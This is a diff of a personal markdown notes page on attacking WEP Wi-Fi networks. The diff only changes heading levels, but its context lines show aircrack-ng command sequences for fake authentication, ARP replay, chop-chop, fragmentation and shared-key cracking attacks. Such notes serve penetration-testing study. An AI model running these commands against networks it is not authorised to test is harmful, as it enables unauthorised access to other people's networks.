@@ -4,7 +4,7 @@ title: Hacking Wifi - WEP
 
 Less probabable to find it today but important to have notes about how to attack them.
 
-# Fake Authentication Attack
+## Fake Authentication Attack
 
 ```
 airmon-ng start wlan0
@@ -16,7 +16,7 @@ aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <nuestraMAC> wla
 aircrack-ng –b <BSSID> <archivoPCAP>
 ```
 
-# ARP Replay Attack
+## ARP Replay Attack
 
 ```
 airmon-ng start wlan0
@@ -27,7 +27,7 @@ aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <nuestraMAC> wlan0mon
 aircrack-ng –b <BSSID> <archivoPCAP>
 ```
 
-# Chop Chop Attack
+## Chop Chop Attack
 
 ```
 airmon-ng start wlan0
@@ -42,7 +42,7 @@ aireplay-ng -2 –r <FileName2> wlan0mon
 aircrack-ng <archivoPCAP>
 ```
 
-# Fragmentation Attack
+## Fragmentation Attack
 
 ```
 airmon-ng start wlan0
@@ -57,7 +57,7 @@ aireplay-ng -2 –r <FileName2> wlan0mon
 aircrack-ng <archivoPCAP>
 ```
 
-# SKA Type Cracking
+## SKA Type Cracking
 
 ```
 airmon-ng start wlan0
